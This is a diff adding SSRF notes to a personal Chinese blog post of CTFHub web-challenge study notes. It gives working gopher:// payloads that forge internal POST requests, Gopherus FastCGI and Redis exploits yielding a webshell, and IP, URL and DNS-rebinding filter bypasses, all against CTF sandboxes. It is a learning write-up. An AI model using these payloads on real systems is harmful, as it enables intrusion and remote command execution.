@@ -10,7 +10,7 @@
 <meta name="description" content="学习CTFHub的一些记录和备忘，用于日后复习查询" /><meta name="keywords" content='CTFHUB, 信息安全, 网络安全, 笔记' /><meta itemprop="name" content="CTFHub笔记-Web章节">
 <meta itemprop="description" content="学习CTFHub的一些记录和备忘，用于日后复习查询"><meta itemprop="datePublished" content="2023-01-14T11:29:58+08:00" />
 <meta itemprop="dateModified" content="2023-01-14T11:29:58+08:00" />
-<meta itemprop="wordCount" content="4626"><meta itemprop="image" content="https://andreoy.cn/logo.png"/>
+<meta itemprop="wordCount" content="6772"><meta itemprop="image" content="https://andreoy.cn/logo.png"/>
 <meta itemprop="keywords" content="CTFHUB,信息安全,网络安全,笔记," /><meta property="og:title" content="CTFHub笔记-Web章节" />
 <meta property="og:description" content="学习CTFHub的一些记录和备忘，用于日后复习查询" />
 <meta property="og:type" content="article" />
@@ -35,7 +35,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/andreoy.cn\/posts\/ctfhub%E7%AC%94%E8%AE%B0-web\/"
-    },"genre": "posts","keywords": "CTFHUB, 信息安全, 网络安全, 笔记","wordcount":  4626 ,
+    },"genre": "posts","keywords": "CTFHUB, 信息安全, 网络安全, 笔记","wordcount":  6772 ,
     "url": "https:\/\/andreoy.cn\/posts\/ctfhub%E7%AC%94%E8%AE%B0-web\/","datePublished": "2023-01-14T11:29:58+08:00","dateModified": "2023-01-14T11:29:58+08:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
@@ -204,7 +204,7 @@
     alt="Andreo Y."
     title="Andreo Y."/>&nbsp;Andreo Y.</a></span>
           <span class="post-category">收录于 <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 信息安全</a></span></div>
-      <div class="post-meta-line"><span title=2023-01-14&#32;11:29:58><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-01-14">2023-01-14</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 4626 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 10 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="CTFHub笔记-Web章节">
+      <div class="post-meta-line"><span title=2023-01-14&#32;11:29:58><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-01-14">2023-01-14</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 6772 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 14 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="CTFHub笔记-Web章节">
               <i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
             </span>&nbsp;</div>
     </div><div class="featured-image"><img
@@ -267,7 +267,21 @@
         <li><a href="#综合过滤练习">综合过滤练习</a></li>
       </ul>
     </li>
-    <li><a href="#ssrf">SSRF</a></li>
+    <li><a href="#ssrf">SSRF</a>
+      <ul>
+        <li><a href="#内网访问">内网访问</a></li>
+        <li><a href="#伪协议读取文件">伪协议读取文件</a></li>
+        <li><a href="#端口扫描">端口扫描</a></li>
+        <li><a href="#post请求">POST请求</a></li>
+        <li><a href="#上传文件">上传文件</a></li>
+        <li><a href="#fastcgi协议">FastCGI协议</a></li>
+        <li><a href="#redis协议">Redis协议</a></li>
+        <li><a href="#url-bypass">URL Bypass</a></li>
+        <li><a href="#数字ip-bypass">数字IP Bypass</a></li>
+        <li><a href="#302跳转-bypass">302跳转 Bypass</a></li>
+        <li><a href="#dns重绑定-bypass">DNS重绑定 Bypass</a></li>
+      </ul>
+    </li>
   </ul>
 </nav></div>
       </div><div
@@ -350,6 +364,14 @@
     alt="image-20230114191404524"
     title="image-20230114191404524"/></p>
 <h2 id="sql注入">SQL注入</h2>
+<div class="details admonition danger open">
+    <div class="details-summary admonition-title">
+      <i class="icon fa-solid fa-skull-crossbones fa-fw" aria-hidden="true"></i>注意<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i>
+    </div>
+    <div class="details-content">
+      <div class="admonition-content">手工注入时，先判断注入类型</div>
+    </div>
+  </div>
 <h3 id="整数型注入">整数型注入</h3>
 <h4 id="手工判断能否注入">手工判断能否注入</h4>
 <p>输入<code>1 and 1=0</code>，无返回结果；输入<code>1 and 1=1</code>，有输出$\Rightarrow$存在注入</p>
@@ -632,6 +654,158 @@ flag in &lt;code&gt;/flag&lt;/code&gt;
 <p>过滤了<code>|</code> <code>&amp;</code> <code>;</code>，那就用换行（\n)。即<code>%0a</code></p>
 <p>grep在这里好像有点无敌（</p>
 <h2 id="ssrf">SSRF</h2>
+<h3 id="内网访问">内网访问</h3>
+<p>如果有url参数，在url中输入内网ip即可访问该地址。</p>
+<h3 id="伪协议读取文件">伪协议读取文件</h3>
+<p>同样是url参数内容：</p>
+<pre tabindex="0"><code>url=file://[文件绝对路径]
+</code></pre><p>即可访问文件。记得如果有根目录的话开头会有三个斜杠</p>
+<h3 id="端口扫描">端口扫描</h3>
+<p>用burp扫描端口，本题默认本地文件，则<code>url=127.0.0.1:[端口]</code></p>
+<h3 id="post请求">POST请求</h3>
+<ul>
+<li>index.php源码</li>
+</ul>
+<pre tabindex="0"><code class="language-php+HTML" data-lang="php+HTML">&lt;?php
+
+error_reporting(0);
+
+if (!isset($_REQUEST[&#39;url&#39;])){
+    header(&#34;Location: /?url=_&#34;);
+    exit;
+}
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#39;url&#39;]);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_exec($ch);
+curl_close($ch);
+</code></pre><ul>
+<li>flag.php源码</li>
+</ul>
+<pre tabindex="0"><code class="language-php+HTML" data-lang="php+HTML">&lt;?php
+
+error_reporting(0);
+
+if ($_SERVER[&#34;REMOTE_ADDR&#34;] != &#34;127.0.0.1&#34;) {
+    echo &#34;Just View From 127.0.0.1&#34;;
+    return;
+}
+
+$flag=getenv(&#34;CTFHUB&#34;);
+$key = md5($flag);
+
+if (isset($_POST[&#34;key&#34;]) &amp;&amp; $_POST[&#34;key&#34;] == $key) {
+    echo $flag;
+    exit;
+}
+?&gt;
+
+&lt;form action=&#34;/flag.php&#34; method=&#34;post&#34;&gt;
+&lt;input type=&#34;text&#34; name=&#34;key&#34;&gt;
+&lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt;
+&lt;/form&gt;
+</code></pre><p>首先按源码里说的，从<code>url=127.0.0.1/flag.php</code>获得MD5加密后的key。这个key是无法直接上传的，但是可以制作一个POST请求，然后用curl支持的gopher协议上传。</p>
+<p>使用浏览器的F12做一个上传按钮，生成一个上传的request，send to repeater</p>
+<p>删去一些不必要的参数，修改host为本地127.0.0.1，完整内容如下。留下的三个参数是不可或缺的三个POST所需参数。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/flag.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">127.0.0.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">36</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">key=0db803a4686b5601be58786ade871dc9
+</span></span></code></pre></div><p>index.php会进行一次解码，flag.php会进行一次解码，所以要encode两次，把百分号再encode成%25，如下。用burp弄即可。先convert all characters，再convert key characters。</p>
+<pre tabindex="0"><code>%2550%254f%2553%2554%2520%252f%2566%256c%2561%2567%252e%2570%2568%2570%2520%2548%2554%2554%2550%252f%2531%252e%2531%250d%250a%2548%256f%2573%2574%253a%2520%2531%2532%2537%252e%2530%252e%2530%252e%2531%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%254c%2565%256e%2567%2574%2568%253a%2520%2533%2536%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%2554%2579%2570%2565%253a%2520%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%2578%252d%2577%2577%2577%252d%2566%256f%2572%256d%252d%2575%2572%256c%2565%256e%2563%256f%2564%2565%2564%250d%250a%250d%250a%256b%2565%2579%253d%2530%2564%2562%2538%2530%2533%2561%2534%2536%2538%2536%2562%2535%2536%2530%2531%2562%2565%2535%2538%2537%2538%2536%2561%2564%2565%2538%2537%2531%2564%2563%2539
+</code></pre><p>访问即可得到flag</p>
+<pre tabindex="0"><code>challenge-3925d6875a1425bd.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_%2550%254f%2553%2554%2520%252f%2566%256c%2561%2567%252e%2570%2568%2570%2520%2548%2554%2554%2550%252f%2531%252e%2531%250d%250a%2548%256f%2573%2574%253a%2520%2531%2532%2537%252e%2530%252e%2530%252e%2531%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%254c%2565%256e%2567%2574%2568%253a%2520%2533%2536%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%2554%2579%2570%2565%253a%2520%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%2578%252d%2577%2577%2577%252d%2566%256f%2572%256d%252d%2575%2572%256c%2565%256e%2563%256f%2564%2565%2564%250d%250a%250d%250a%256b%2565%2579%253d%2530%2564%2562%2538%2530%2533%2561%2534%2536%2538%2536%2562%2535%2536%2530%2531%2562%2565%2535%2538%2537%2538%2536%2561%2564%2565%2538%2537%2531%2564%2563%2539
+</code></pre><p>其中80是必须加的，因为gopher协议的默认端口并不是80。</p>
+<h3 id="上传文件">上传文件</h3>
+<ul>
+<li>flag.php源码</li>
+</ul>
+<pre tabindex="0"><code class="language-php+HTML" data-lang="php+HTML">&lt;?php
+
+error_reporting(0);
+
+if($_SERVER[&#34;REMOTE_ADDR&#34;] != &#34;127.0.0.1&#34;){
+    echo &#34;Just View From 127.0.0.1&#34;;
+    return;
+}
+
+if(isset($_FILES[&#34;file&#34;]) &amp;&amp; $_FILES[&#34;file&#34;][&#34;size&#34;] &gt; 0){
+    echo getenv(&#34;CTFHUB&#34;);
+    exit;
+}
+?&gt;
+
+Upload Webshell
+
+&lt;form action=&#34;/flag.php&#34; method=&#34;post&#34; enctype=&#34;multipart/form-data&#34;&gt;
+    &lt;input type=&#34;file&#34; name=&#34;file&#34;&gt;
+&lt;/form&gt;
+</code></pre><p>上题中添加按钮上传一步，可以改为控制台的命令：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">f</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s1">&#39;form&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">f</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">()</span>
+</span></span></code></pre></div><p>后面和上一题处理基本相同，就是把密钥改成上传一个文件即可。</p>
+<h3 id="fastcgi协议">FastCGI协议</h3>
+<a href="https://github.com/tarunkant/Gopherus" title="gopherus"target="_blank" rel="external nofollow noopener noreferrer" class="card-link"><span class="cl-backdrop" style="--cl-bg-url: url(/fixit.min.svg);"></span>
+    <span class="cl-content">
+      <span class="cl-text">
+        <span class="cl-title">Gopher协议工具</span>
+        <span class="cl-meta">
+          <svg class="cl-icon-link" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="16" height="16"><path d="M574 665.4c-3.1-3.1-8.2-3.1-11.3 0L446.5 781.6c-53.8 53.8-144.6 59.5-204 0-59.5-59.5-53.8-150.2 0-204l116.2-116.2c3.1-3.1 3.1-8.2 0-11.3l-39.8-39.8c-3.1-3.1-8.2-3.1-11.3 0L191.4 526.5c-84.6 84.6-84.6 221.5 0 306s221.5 84.6 306 0l116.2-116.2c3.1-3.1 3.1-8.2 0-11.3L574 665.4zM832.6 191.4c-84.6-84.6-221.5-84.6-306 0L410.3 307.6c-3.1 3.1-3.1 8.2 0 11.3l39.7 39.7c3.1 3.1 8.2 3.1 11.3 0l116.2-116.2c53.8-53.8 144.6-59.5 204 0 59.5 59.5 53.8 150.2 0 204L665.3 562.6c-3.1 3.1-3.1 8.2 0 11.3l39.8 39.8c3.1 3.1 8.2 3.1 11.3 0l116.2-116.2c84.5-84.6 84.5-221.5 0-306.1z" fill="#a9a9b3"></path><path d="M610.1 372.3c-3.1-3.1-8.2-3.1-11.3 0L372.3 598.7c-3.1 3.1-3.1 8.2 0 11.3l39.6 39.6c3.1 3.1 8.2 3.1 11.3 0l226.4-226.4c3.1-3.1 3.1-8.2 0-11.3l-39.5-39.6z" fill="#a9a9b3"></path></svg>
+          <span class="cl-url">https://github.com/tarunkant/Gopherus</span>
+        </span>
+      </span><svg class="cl-icon-globe" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="64" height="64"><path d="M960 512c0 249.408-203.2 448-448 448-244.778667 0-448-198.592-448-448S262.592 64 512 64s448 198.592 448 448" fill="#2196F3"></path><path d="M507.52 718.08c0-8.96-4.48-13.44-13.44-17.92-26.88-8.96-53.76-8.96-76.16-31.381333-4.48-8.96-4.48-17.92-8.96-26.88-8.96-8.96-31.36-13.44-44.8-17.92h-89.6c-13.44-4.48-22.4-22.4-31.36-35.84 0-4.48 0-13.461333-8.96-13.461334-8.96-4.458667-17.92 4.501333-26.88 0-4.48-4.458667-4.48-8.96-4.48-13.418666 0-13.461333 8.96-26.901333 17.92-35.861334 13.44-8.96 26.88 4.48 40.32 4.48 4.48 0 4.48 0 8.96 4.48 13.44 4.48 17.92 22.4 17.92 35.861334v8.96c0 4.48 4.48 4.48 8.96 4.48 4.48-22.4 4.48-44.821333 8.96-67.2 0-26.88 26.88-53.781333 49.28-62.72 8.96-4.458667 13.44 4.501333 22.4 0 26.88-8.96 94.08-35.84 80.64-71.658667-8.96-31.381333-35.84-62.698667-71.68-58.24-8.96 4.501333-13.44 8.96-22.4 13.461333-13.44 8.96-40.32 35.84-53.76 35.84-22.4-4.48-22.4-35.84-17.92-49.301333 4.48-17.92 44.8-76.138667 71.68-67.178667l17.92 17.92c8.96 4.48 22.4 4.48 35.84 4.48 4.48 0 8.96 0 13.44-4.48 4.48-4.48 4.48-4.48 4.48-8.96 0-13.44-13.44-26.901333-22.4-35.861333s-22.4-17.92-35.84-22.378667c-44.8-13.461333-116.48 4.458667-152.32 35.84-35.84 31.36-62.72 85.12-80.64 129.92-8.96 26.88-17.92 62.698667-22.4 94.08-4.48 22.4-8.96 40.32 4.48 62.698667 13.44 26.88 40.32 53.781333 67.2 71.68 17.92 13.44 53.76 13.44 71.68 35.84 13.44 17.941333 8.96 40.32 8.96 62.72 0 26.88 17.92 49.28 26.88 71.658667 4.48 13.461333 8.96 31.381333 13.44 44.821333 0 4.48 4.48 31.36 4.48 35.84 26.88 13.44 49.28 26.901333 80.64 35.861333 4.48 0 22.4-26.901333 22.4-31.381333 13.44-13.44 22.4-31.36 35.84-40.32 8.96-4.48 17.92-8.96 26.88-17.941333 8.96-8.96 13.44-26.88 17.92-40.32 4.48-8.938667 8.96-26.858667 4.48-40.298667M516.48 305.92c4.48 0 8.96-4.48 17.92-8.96 13.44-8.96 26.901333-22.4 40.32-31.36 13.461333-8.96 26.901333-22.4 35.861333-31.36 13.44-8.96 22.4-26.88 26.88-40.341333 4.48-8.96 17.941333-26.88 13.44-40.32-4.48-8.96-26.88-13.44-35.84-17.92C579.2 126.698667 547.84 122.24 512 122.24c-13.44 0-31.36 4.458667-35.84 17.92-4.48 22.4 13.44 17.92 31.36 22.4 0 0 4.48 35.84 4.48 40.32 4.48 22.421333-8.96 35.84-8.96 58.24 0 13.44 0 35.84 8.96 44.8h4.48zM892.8 619.52c4.501333-8.96 4.501333-22.4 8.96-31.36 4.501333-22.421333 4.501333-44.8 4.501333-67.2 0-44.8-4.501333-89.578667-17.92-129.92-8.96-13.44-13.461333-26.88-17.941333-40.341333-8.96-22.378667-22.4-44.8-40.32-62.698667-17.92-22.4-40.341333-85.12-80.64-67.2-13.44 4.501333-22.4 22.421333-31.36 31.381333l-26.88 40.32c-4.501333 4.48-8.96 13.44-4.501333 17.92 0 4.48 4.501333 4.48 8.96 4.48 8.96 4.501333 13.461333 4.501333 22.421333 8.96 4.48 0 8.96 4.501333 4.48 8.96 0 0 0 4.501333-4.48 4.501334-22.421333 22.4-44.8 40.32-67.2 62.698666-4.48 4.48-8.96 13.44-8.96 17.92s4.48 4.48 4.48 8.96c0 4.501333-4.48 4.501333-8.96 8.96-8.96 4.501333-17.92 8.96-22.4 13.461334-4.48 8.96 0 22.4-4.48 31.36-4.48 22.4-17.941333 40.32-26.901333 62.72-8.96 13.418667-13.418667 26.88-22.378667 40.32 0 17.92-4.501333 31.36 4.458667 44.8 22.421333 31.36 62.72 13.44 94.08 26.901333 8.96 4.458667 17.92 4.458667 22.421333 13.418667 13.418667 13.461333 13.418667 35.861333 17.92 49.301333 4.458667 17.92 8.96 35.84 17.92 53.76 4.48 22.421333 13.44 44.821333 17.92 62.72 40.341333-31.36 76.16-67.178667 103.04-112 26.88-31.424 40.341333-67.242667 53.76-103.104" fill="#CDDC39"></path></svg></span></a>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ py gopherus.py --exploit fastcgi
+</span></span></code></pre></div><p>按要求输入一个存在的php文件和一个系统命令，即可生成编码一次的gopher://开头的url。</p>
+<p>放入burp再编码一次key character，即可完全复制到<code>/?url=</code>后面。</p>
+<p>grep慎用，因为服务端不一定是threadripper</p>
+<h3 id="redis协议">Redis协议</h3>
+<p>同样使用gopherus，然后直接访问生成的shell.php即可</p>
+<pre tabindex="0"><code>challenge-be9110e1ea94749a.sandbox.ctfhub.com:10800/shell.php?cmd=[系统命令]
+</code></pre><h3 id="url-bypass">URL Bypass</h3>
+<p>题目要求用一个奇怪的域名作为URL的开头。但是，注意到http协议的url格式：</p>
+<pre tabindex="0"><code>┌────────────────────────────────────────────────────────────────────────────────────────────────┐
+│                                              href                                              │
+├──────────┬──┬─────────────────────┬────────────────────────┬───────────────────────────┬───────┤
+│ protocol │  │        auth         │          host          │           path            │ hash  │
+│          │  │                     ├─────────────────┬──────┼──────────┬────────────────┤       │
+│          │  │                     │    hostname     │ port │ pathname │     search     │       │
+│          │  │                     │                 │      │          ├─┬──────────────┤       │
+│          │  │                     │                 │      │          │ │    query     │       │
+&#34;  https:   //    user   :   pass   @ sub.example.com : 8080   /p/a/t/h  ?  query=string   #hash &#34;
+│          │  │          │          │    hostname     │ port │          │                │       │
+│          │  │          │          ├─────────────────┴──────┤          │                │       │
+│ protocol │  │ username │ password │          host          │          │                │       │
+├──────────┴──┼──────────┴──────────┼────────────────────────┤          │                │       │
+│   origin    │                     │         origin         │ pathname │     search     │ hash  │
+├─────────────┴─────────────────────┴────────────────────────┴──────────┴────────────────┴───────┤
+│                                              href                                              │
+└────────────────────────────────────────────────────────────────────────────────────────────────┘
+(All spaces in the &#34;&#34; line should be ignored. They are purely for formatting.)
+</code></pre><p>把那个奇怪的域名作为username即可，然后用127.0.0.1本地访问flag.php</p>
+<h3 id="数字ip-bypass">数字IP Bypass</h3>
+<p>不能用127和点，可以直接把ipv4换成一个数字，<code>127*256*256*256+1=2130706433</code>，就用2130706433代替127.0.0.1即可</p>
+<p>同时，也可以直接用localhost代替127.0.0.1</p>
+<h3 id="302跳转-bypass">302跳转 Bypass</h3>
+<p>首先，并没有禁用localhost和数字ip，所以上一题的方法仍然适用</p>
+<p>然后也可以找一个可以跳转到127.0.0.1/flag.php的短链接，但是没找到好的生成网站所以就算了（其实用自己的域名和服务器可以做）</p>
+<h3 id="dns重绑定-bypass">DNS重绑定 Bypass</h3>
+<a href="https://lock.cmpxchg8b.com/rebinder.html" title="rebinder"target="_blank" rel="external nofollow noopener noreferrer" class="card-link"><span class="cl-backdrop" style="--cl-bg-url: url(/fixit.min.svg);"></span>
+    <span class="cl-content">
+      <span class="cl-text">
+        <span class="cl-title">生成器</span>
+        <span class="cl-meta">
+          <svg class="cl-icon-link" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="16" height="16"><path d="M574 665.4c-3.1-3.1-8.2-3.1-11.3 0L446.5 781.6c-53.8 53.8-144.6 59.5-204 0-59.5-59.5-53.8-150.2 0-204l116.2-116.2c3.1-3.1 3.1-8.2 0-11.3l-39.8-39.8c-3.1-3.1-8.2-3.1-11.3 0L191.4 526.5c-84.6 84.6-84.6 221.5 0 306s221.5 84.6 306 0l116.2-116.2c3.1-3.1 3.1-8.2 0-11.3L574 665.4zM832.6 191.4c-84.6-84.6-221.5-84.6-306 0L410.3 307.6c-3.1 3.1-3.1 8.2 0 11.3l39.7 39.7c3.1 3.1 8.2 3.1 11.3 0l116.2-116.2c53.8-53.8 144.6-59.5 204 0 59.5 59.5 53.8 150.2 0 204L665.3 562.6c-3.1 3.1-3.1 8.2 0 11.3l39.8 39.8c3.1 3.1 8.2 3.1 11.3 0l116.2-116.2c84.5-84.6 84.5-221.5 0-306.1z" fill="#a9a9b3"></path><path d="M610.1 372.3c-3.1-3.1-8.2-3.1-11.3 0L372.3 598.7c-3.1 3.1-3.1 8.2 0 11.3l39.6 39.6c3.1 3.1 8.2 3.1 11.3 0l226.4-226.4c3.1-3.1 3.1-8.2 0-11.3l-39.5-39.6z" fill="#a9a9b3"></path></svg>
+          <span class="cl-url">https://lock.cmpxchg8b.com/rebinder.html</span>
+        </span>
+      </span><svg class="cl-icon-globe" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="64" height="64"><path d="M960 512c0 249.408-203.2 448-448 448-244.778667 0-448-198.592-448-448S262.592 64 512 64s448 198.592 448 448" fill="#2196F3"></path><path d="M507.52 718.08c0-8.96-4.48-13.44-13.44-17.92-26.88-8.96-53.76-8.96-76.16-31.381333-4.48-8.96-4.48-17.92-8.96-26.88-8.96-8.96-31.36-13.44-44.8-17.92h-89.6c-13.44-4.48-22.4-22.4-31.36-35.84 0-4.48 0-13.461333-8.96-13.461334-8.96-4.458667-17.92 4.501333-26.88 0-4.48-4.458667-4.48-8.96-4.48-13.418666 0-13.461333 8.96-26.901333 17.92-35.861334 13.44-8.96 26.88 4.48 40.32 4.48 4.48 0 4.48 0 8.96 4.48 13.44 4.48 17.92 22.4 17.92 35.861334v8.96c0 4.48 4.48 4.48 8.96 4.48 4.48-22.4 4.48-44.821333 8.96-67.2 0-26.88 26.88-53.781333 49.28-62.72 8.96-4.458667 13.44 4.501333 22.4 0 26.88-8.96 94.08-35.84 80.64-71.658667-8.96-31.381333-35.84-62.698667-71.68-58.24-8.96 4.501333-13.44 8.96-22.4 13.461333-13.44 8.96-40.32 35.84-53.76 35.84-22.4-4.48-22.4-35.84-17.92-49.301333 4.48-17.92 44.8-76.138667 71.68-67.178667l17.92 17.92c8.96 4.48 22.4 4.48 35.84 4.48 4.48 0 8.96 0 13.44-4.48 4.48-4.48 4.48-4.48 4.48-8.96 0-13.44-13.44-26.901333-22.4-35.861333s-22.4-17.92-35.84-22.378667c-44.8-13.461333-116.48 4.458667-152.32 35.84-35.84 31.36-62.72 85.12-80.64 129.92-8.96 26.88-17.92 62.698667-22.4 94.08-4.48 22.4-8.96 40.32 4.48 62.698667 13.44 26.88 40.32 53.781333 67.2 71.68 17.92 13.44 53.76 13.44 71.68 35.84 13.44 17.941333 8.96 40.32 8.96 62.72 0 26.88 17.92 49.28 26.88 71.658667 4.48 13.461333 8.96 31.381333 13.44 44.821333 0 4.48 4.48 31.36 4.48 35.84 26.88 13.44 49.28 26.901333 80.64 35.861333 4.48 0 22.4-26.901333 22.4-31.381333 13.44-13.44 22.4-31.36 35.84-40.32 8.96-4.48 17.92-8.96 26.88-17.941333 8.96-8.96 13.44-26.88 17.92-40.32 4.48-8.938667 8.96-26.858667 4.48-40.298667M516.48 305.92c4.48 0 8.96-4.48 17.92-8.96 13.44-8.96 26.901333-22.4 40.32-31.36 13.461333-8.96 26.901333-22.4 35.861333-31.36 13.44-8.96 22.4-26.88 26.88-40.341333 4.48-8.96 17.941333-26.88 13.44-40.32-4.48-8.96-26.88-13.44-35.84-17.92C579.2 126.698667 547.84 122.24 512 122.24c-13.44 0-31.36 4.458667-35.84 17.92-4.48 22.4 13.44 17.92 31.36 22.4 0 0 4.48 35.84 4.48 40.32 4.48 22.421333-8.96 35.84-8.96 58.24 0 13.44 0 35.84 8.96 44.8h4.48zM892.8 619.52c4.501333-8.96 4.501333-22.4 8.96-31.36 4.501333-22.421333 4.501333-44.8 4.501333-67.2 0-44.8-4.501333-89.578667-17.92-129.92-8.96-13.44-13.461333-26.88-17.941333-40.341333-8.96-22.378667-22.4-44.8-40.32-62.698667-17.92-22.4-40.341333-85.12-80.64-67.2-13.44 4.501333-22.4 22.421333-31.36 31.381333l-26.88 40.32c-4.501333 4.48-8.96 13.44-4.501333 17.92 0 4.48 4.501333 4.48 8.96 4.48 8.96 4.501333 13.461333 4.501333 22.421333 8.96 4.48 0 8.96 4.501333 4.48 8.96 0 0 0 4.501333-4.48 4.501334-22.421333 22.4-44.8 40.32-67.2 62.698666-4.48 4.48-8.96 13.44-8.96 17.92s4.48 4.48 4.48 8.96c0 4.501333-4.48 4.501333-8.96 8.96-8.96 4.501333-17.92 8.96-22.4 13.461334-4.48 8.96 0 22.4-4.48 31.36-4.48 22.4-17.941333 40.32-26.901333 62.72-8.96 13.418667-13.418667 26.88-22.378667 40.32 0 17.92-4.501333 31.36 4.458667 44.8 22.421333 31.36 62.72 13.44 94.08 26.901333 8.96 4.458667 17.92 4.458667 22.421333 13.418667 13.418667 13.461333 13.418667 35.861333 17.92 49.301333 4.458667 17.92 8.96 35.84 17.92 53.76 4.48 22.421333 13.44 44.821333 17.92 62.72 40.341333-31.36 76.16-67.178667 103.04-112 26.88-31.424 40.341333-67.242667 53.76-103.104" fill="#CDDC39"></path></svg></span></a>
+<p>使用这个生成器，可以将一个域名解析到两个不同的IP地址，并且切换的TTL很小，有时可以骗过一些检测。本题不能用带127的东西访问，却又要求从127.0.0.1进入。</p>
+<p>随便选一个网址对应的ipv4，例如ctfhub.com[180.163.28.105]</p>
+<p>得到一个网址<code>7f000001.b4a31c69.rbndr.us</code></p>
+<p>于是用以上网址替代127.0.0.1，多刷几次就得到flag了。</p>
 </div><div class="post-footer" id="post-footer">
   <div class="post-info">
     <div class="post-info-line">
